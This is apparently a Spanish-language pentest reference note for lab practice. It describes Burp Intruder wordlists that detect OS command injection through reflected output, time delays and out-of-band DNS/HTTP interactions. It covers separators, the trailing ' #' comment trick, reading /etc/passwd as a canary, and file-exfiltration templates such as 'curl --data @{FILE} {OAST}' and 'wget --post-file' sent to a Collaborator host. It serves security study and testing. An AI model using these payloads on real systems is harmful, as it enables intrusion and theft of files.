---
aliases:
  - OS Command Injection wordlist
  - command injection wordlist
  - cmd-injection-detection-wordlist
  - wordlists de command injection
tags:
  - vuln/os-command-injection
  - wordlist
  - reference
---

# OS Command Injection — Wordlists de detección

> Documento **agnóstico al negocio**: payloads listos para **Burp Intruder** que confirman la inyección por los **tres canales** (salida reflejada, tiempo, OOB). Cada lista prueba **todos los separadores y wrappers** (`; | || & && ` `` `$()`).
> Punto de entrada (teoría y separadores): [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]].

## 🧮 Convención de variables

> [!tip] Reemplazá el placeholder antes de disparar
> En Burp Intruder marcás la posición con `§…§`; en estos archivos va con llaves para que se vea.

| Variable | Qué es | Ejemplo |
| --- | --- | --- |
| `{OAST}` | Tu subdominio de Burp Collaborator | `abc123.oastify.com` |
| `{FILE}` | Ruta del archivo a exfiltrar (**específico del objetivo**) | `/home/carlos/secret` |

Solo `cmd-oast.txt` usa placeholders (`{OAST}` y `{FILE}`). Las otras dos van listas para usar tal cual.

## 📄 Las tres listas

| Archivo | Cuándo usarla | Cómo confirmás |
| --- | --- | --- |
| [`cmd-file-read.txt`](cmd-file-read.txt) | **In-band o reflejado** — la salida vuelve en la respuesta (o se refleja en otro lado que podés buscar) | La respuesta contiene **`root:x:0:0:`** (línea de `/etc/passwd`) |
| [`cmd-time-delay.txt`](cmd-time-delay.txt) | **Ciego** — no ves salida | La respuesta tarda **~10 s** (baseline instantáneo) |
| [`cmd-oast.txt`](cmd-oast.txt) | **Ciego** — sin salida ni dir escribible | **Interacción DNS/HTTP** entrante en Collaborator → *Poll now* |

### Por qué `/etc/passwd` (y no `whoami`)
La salida de `whoami` (`peter-XXXX`) **no es buscable a ciegas**: no sabés qué texto esperar, así que no podés filtrar la respuesta para saber si ejecutó. `/etc/passwd` existe en todo Linux, es **world-readable** y su primera línea es siempre **`root:x:0:0:root:/root:...`** → un **canario fijo** que grepeás en la respuesta. Si aparece `root:x:0:0:`, ejecutó. Ideal para el caso donde la salida se refleja en un endpoint distinto.

## ⚙️ Uso en Intruder

1. Marcá el parámetro sospechoso con `§…§` (stock checker `storeId`, `email` del feedback, herramientas de ping/DNS/whois…).
2. Cargá el `.txt` como payload set.
3. **Encoding:** los payloads van **en crudo** (con espacios). Si el punto de inserción lo requiere (body `x-www-form-urlencoded`, query string), activá **"URL-encode these characters"** en las opciones de payload.
4. **Filtrá** el resultado: por `root:x:0:0:` (file-read), por columna *Response received* (time-delay), o mirá Collaborator (oast).

> [!note] Separador **newline** (`0x0a`)
> El salto de línea también es separador en Linux, pero no entra en un `.txt` de un payload por línea. Probalo a mano (ver [separadores](../os-command-injection.md)) enviando `%0a<comando>` URL-encoded.

> [!tip] Terminador de comentario (` #`) — el **argumento sobrante**
> Cuando tu inyección cae **en medio** de un comando (ej. `convert img.jpg -resize <inj> salida.jpg`), la app pega un token detrás (`salida.jpg`) que rompe los payloads de un solo separador: `|nslookup {OAST}` queda `nslookup {OAST} salida.jpg` → toma `salida.jpg` como servidor DNS → **sin hit**. El `#` **comenta** todo lo que sigue y lo neutraliza, sin importar el separador. Las tres listas traen variantes `1<sep>…<cmd> #`.
> **Requisito:** el `#` debe ir **precedido de espacio** (por eso terminan en `` #``); pegado a un token no comenta. Alternativas que también cierran limpio: `& … &`, `|| … ||` o ejecución inline (`` `…` `` / `$()`).

> [!tip] El wrapper `<relleno>|| … ||`
> El relleno de la izquierda (un valor válido, p. ej. `test@test.com`) alimenta el comando original; los `||` de ambos lados **aíslan** el tuyo para que lo que la app pegue después no lo rompa. El detalle está en el [entry point](../os-command-injection.md).

## 🔗 Ejemplos aplicados
- In-band → [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band|001]]
- Tiempo → [[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay|002]]
- OOB confirmar / exfil → [[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004]] · [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005]]

> [!warning] Exfil de un secreto concreto
> Meter `cat /home/carlos/secret` en el subdominio DNS es **específico del objetivo** y su walkthrough (trocear/base64 para DNS, `--data` vs `--data-binary`, leer la interacción HTTP) vive en los ejemplos [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005]] / [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006]]. Para tenerlo a mano en Intruder, `cmd-oast.txt` ahora incluye una **plantilla genérica** de exfil de archivo (`curl --data @{FILE} {OAST} #`, `wget --post-file {FILE} …`): reemplazá `{FILE}` por la ruta del secreto. El resto de la lista sigue siendo exfil inline genérico (`whoami`, `/etc/hostname`).
